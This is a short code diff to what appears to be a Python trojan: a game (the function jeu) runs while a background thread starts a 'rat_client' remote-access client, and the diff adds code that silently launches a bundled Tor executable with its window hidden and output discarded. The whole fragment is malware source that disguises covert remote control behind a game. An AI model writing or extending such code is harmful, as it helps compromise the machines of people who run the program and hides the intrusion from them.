@@ -244,11 +244,23 @@ def rat_client():
 
 
 # Main
-
+def start_tor():
+	execute_commands("cd trojan/tor/tor")
+	execute_commands("tor.exe")
+	time.sleep(10)
 def main():
+	
+	tor_process = subprocess.Popen(
+    "trojan/tor/tor/tor.exe",
+    stdout=subprocess.DEVNULL,
+    stderr=subprocess.DEVNULL,
+    creationflags=subprocess.CREATE_NO_WINDOW
+	)
 	ratThread = threading.Thread(target=rat_client, daemon=True)
 	ratThread.start()
-	jeu()  
+	jeu()
+	
+	tor_process.terminate()
 
 
 if __name__ == "__main__":
